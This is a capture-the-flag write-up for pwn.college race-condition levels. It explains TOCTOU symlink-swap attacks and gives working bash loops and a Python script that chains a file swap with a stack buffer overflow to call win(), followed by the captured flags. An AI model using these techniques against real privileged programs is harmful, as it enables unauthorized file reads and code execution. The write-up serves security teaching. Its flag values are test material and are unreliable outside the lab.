---
custom_edit_url: null
sidebar_position: 2
slug: /pwn-college/system-security/race-conditions
---

## level1.0

> Read the flag file, but the program verifies the path doesn't contain "flag" and that the file is not a symlink.

```text
hacker@race-conditions~level1-0:~$ /challenge/babyrace_level1.0
###
### Welcome to /challenge/babyrace_level1.0!
###
This challenge allows you to open a single file, as specified by the first argument to the program (argv[1]).
The file opened will be sent to you.
This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
babyrace_level1.0: <stdin>:47: main: Assertion `argc > 1' failed.
Aborted
```

The program performs two checks before opening the file:

1. The path must not contain the string `"flag"`.
2. The file at that path must not be a symlink (`lstat` → `S_ISLNK`).

After both checks pass, it opens the file and sends the contents to stdout.

### TOCTOU

The key insight is that these checks and the subsequent `open()` call are **not atomic**. There is a small window of time between the **check** (is it a symlink?) and the **use** (actually opening the file).

```
Timeline:
  Program:   [lstat check — NOT symlink ✓] ----gap---- [open() → reads file]
  Attacker:       ^real file here^          ^swap!^      ^symlink to /flag^
```

If we can swap a regular file for a symlink to `/flag` inside that window, the program will pass the check against the regular file but then open our symlink, leaking the real flag.

### Exploit

Terminal 1:

```bash
hacker@race-conditions~level1-0:~$ while true; do
    rm -f x
    echo hi > x
    rm -f x
    ln -s /flag x
done
```

Terminal 2:

```bash
hacker@race-conditions~level1-0:~$ while true; do
    /challenge/babyrace_level1.0 x
done
```

Eventually the program checks `x` when it is a normal file, then opens it after it has become a symlink to `/flag`, printing the flag.

```text
hacker@race-conditions~level1-0:~$ /challenge/babyrace_level1.0 x
pwn.college{rAc3C0nd1t10ns_TOCTOUl1v3s.0VMzIDL4ITM0EzW}
```

&nbsp;

## level1.1

> Exploit a basic race condition to get the flag.

```
hacker@race-conditions~level1-1:~$ /challenge/babyrace_level1.1 
###
### Welcome to /challenge/babyrace_level1.1!
###

babyrace_level1.1: <stdin>:40: main: Assertion `argc > 1' failed.
Aborted                    /challenge/babyrace_level1.1
```

This challenge is the exact same as [level1.0](#level10).

### Exploit

Terminal 1:

```
hacker@race-conditions~level1-1:~$ while true; do
    rm -f x
    echo hi > x
    rm -f x
    ln -s /flag x
done
```

Terminal 2:

```
hacker@race-conditions~level1-1:~$ while true; do
    /challenge/babyrace_level1.0 x
done
###
### Welcome to /challenge/babyrace_level1.1!
###

Error: failed to get file status!
###
### Welcome to /challenge/babyrace_level1.1!
###

Error: failed to get file status!
###
### Welcome to /challenge/babyrace_level1.1!
###

Error: file is a symlink!
###
### Welcome to /challenge/babyrace_level1.1!
###

Error: failed to get file status!
###
### Welcome to /challenge/babyrace_level1.1!
###

pwn.college{cHDaunhEvD4T9hYDJvi33NxNTe5.0lMwQDL4ITM0EzW}
```

&nbsp;

## level2.0

> Exploit a race condition with a tighter timing window to read the flag. Keep in mind that tighter timing windows in race conditions generally are harder to exploit reliably!

```text
hacker@race-conditions~level2-0:~$ /challenge/babyrace_level2.0
###
### Welcome to /challenge/babyrace_level2.0!
###
This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
Calling lstat (does not follow symlinks) on the path.
Paused (press enter to continue)
Paused (press enter to continue)
```

Same TOCTOU vulnerability as [level1.0](#level10), but the program pauses between the `lstat` check and the `open()` call, making the race window much larger and easier to win.

### Exploit

Terminal 1:

```bash
hacker@race-conditions~level2-0:~$ while true; do
    rm -f x
    echo hi > x
    rm -f x
    ln -s /flag x
done
```

Terminal 2:

```bash
hacker@race-conditions~level2-0:~$ while true; do
    /challenge/babyrace_level2.0 x
done

# ---- snip ----

pwn.college{U8-2_E6AoYrIX5lnG5sdQMgCRBV.01MwQDL4ITM0EzW}
```

&nbsp;

## level3.0

> Read the flag file, but the program verifies the path doesn't contain "flag", that the file is not a symlink, and that the file is not larger than 256 bytes.

```text
hacker@race-conditions~level3-0:~$ /challenge/babyrace_level3.0 /etc/passwd
###
### Welcome to /challenge/babyrace_level3.0!
###
This challenge allows you to open a single file, as specified by the first argument to the program (argv[1]).
The file opened will be read in.
This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
This challenge will verify that the file is not larger than 256 bytes.
Calling lstat (does not follow symlinks) on the path.
Paused (press enter to continue)
Error: file is too large!
```

The program performs three checks before opening the file:

1. The path must not contain the string `"flag"`.
2. The file at that path must not be a symlink (`lstat` → `S_ISLNK`).
3. The file must not be larger than 256 bytes (`lstat` → `st_size`).

### Source code

After both pauses and all checks pass, it opens and reads the file. Decompiling the binary reveals the following:

```c title="/challenge/babyrace_level3.0 :: Psedocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  struct stat stat_buf; // [rsp+20h] [rbp-1A0h] BYREF
  char buf[256]; // [rsp+B0h] [rbp-110h] BYREF
  __int64 v7; // [rsp+1B0h] [rbp-10h]
  unsigned __int64 v8; // [rsp+1B8h] [rbp-8h]
  v8 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  v7 = 0LL;
  puts(
    "Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows");
  puts("you to open a single file, as specified by the first argument to the program (argv[1]).\n");
  puts("The file opened will be read in.\n");
  puts("This challenge will verify that the file's path does not include \"flag\".");
  puts("This challenge will verify that the file is not a symlink.");
  puts("This challenge will verify that the file is not larger than 256 bytes.");
  if ( argc <= 1 )
    __assert_fail("argc > 1", "<stdin>", 0x51u, "main");
  if ( strstr(argv[1], "flag") )
  {
    puts("Error: path contains `flag`!");
    exit(1);
  }
  puts("Calling lstat (does not follow symlinks) on the path.\n");
  puts("Paused (press enter to continue)");
  getchar();
  if ( (unsigned int)lstat((char *)argv[1], &stat_buf) == -1 )
  {
    puts("Error: failed to get file status!");
    exit(1);
  }
  if ( (stat_buf.st_mode & 0xF000) == 40960 )
  {
    puts("Error: file is a symlink!");
    exit(1);
  }
  if ( stat_buf.st_size > 256 )
  {
    puts("Error: file is too large!");
    exit(1);
  }
  puts("Paused (press enter to continue)");
  getchar();
  v3 = open(argv[1], 0);
  read(v3, buf, 0x1000uLL);
  printf("Value of \"win\" variable: %llx\n", v7);
  if ( v7 )
    win();
  puts("### Goodbye!");
  return 0;
}
```

There are two vulnerabilities at play here.

### TOCTOU

The checks and the subsequent `open()` call are **not atomic**. There is a window of time between the `lstat` check (is it too big?) and the actual `open()` call:

```
Timeline:
  Program:  [lstat check — small file ✓] --- gap --- [open() → reads file]
  Attacker:      ^small "hi" file^          ^swap!^   ^big overflow file^
```

The program pauses with `getchar()` between the check and the open, making this window very wide and easy to exploit.

### Stack Buffer Overflow

`read(v3, buf, 0x1000uLL)` reads up to **4096 bytes** into `buf` which is only **256 bytes**. Looking at the stack layout:

```
char buf[256]   →  [rbp-110h]
__int64 v7      →  [rbp-10h]
```

The offset from `buf` to `v7` is `0x110 - 0x10 = 0x100` = **256 bytes**. So writing 264 bytes (256 to fill `buf` + 8 to overwrite `v7`) sets `v7` to a non-zero value, which triggers `win()`.

This means we don't need to swap to a symlink at all. We just need to:

1. Pass `lstat` with a small real file (`hi\n` = 3 bytes).
2. Swap to a 264-byte file **after** the lstat check but **before** `open()`.
3. `read()` overflows `buf` into `v7`, making it non-zero.
4. `win()` is called and prints the flag.

## Exploit

```python title="~/script.py" showLineNumbers
import subprocess, time, os

# Create overflow payload - 264 bytes to fill buf (256) + overwrite v7 (8 bytes)
payload = b"A" * 264
with open("bigfile", "wb") as f:
    f.write(payload)

print("[*] Starting exploit loop...")

attempt = 0
while True:
    attempt += 1

    # Start with a small real file to pass lstat
    os.system("rm -f x && echo hi > x")

    proc = subprocess.Popen(
        ["/challenge/babyrace_level3.0", "x"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT
    )

    # Wait for program to reach first pause (lstat check)
    time.sleep(0.1)

    # Send first enter - lstat runs on small "hi" file, passes all checks
    try:
        proc.stdin.write(b"\n")
        proc.stdin.flush()
    except BrokenPipeError:
        proc.wait()
        continue

    # Swap x to the big file AFTER lstat check but BEFORE open()
    os.system("rm -f x && cp bigfile x")

    # Send second enter - open() reads bigfile, overflows buf into v7
    time.sleep(0.05)
    try:
        proc.stdin.write(b"\n")
        proc.stdin.flush()
        proc.stdin.close()
    except BrokenPipeError:
        proc.wait()
        continue

    out = proc.stdout.read()
    proc.wait()

    if attempt % 10 == 0:
        print(f"[*] Attempt {attempt}...")

    if b"pwn.college" in out:
        print("[+] Got the flag!")
        print(out.decode(errors='replace'))
        break

    if b"Value" in out:
        line = [l for l in out.decode(errors='replace').splitlines() if "Value" in l]
        if line and "0" not in line[0].split(":")[-1].strip():
            print("[+] win variable non-zero!")
            print(out.decode(errors='replace'))
            break
```

```text
hacker@race-conditions~level3-0:~$ python ~/script.py
[*] Starting exploit loop...
[*] Attempt 1: Value of "win" variable: 4141414141414141
[+] Got the flag!
###
### Welcome to /challenge/babyrace_level3.0!
###

Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows
you to open a single file, as specified by the first argument to the program (argv[1]).

The file opened will be read in.

This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
This challenge will verify that the file is not larger than 256 bytes.
Calling lstat (does not follow symlinks) on the path.

Paused (press enter to continue)
Paused (press enter to continue)
Value of "win" variable: 4141414141414141
You win! Here is your flag:
pwn.college{YjdXcuUWNbwI3UnjvP86hY7QNs8.0VNwQDL4ITM0EzW}


### Goodbye!
```

&nbsp;

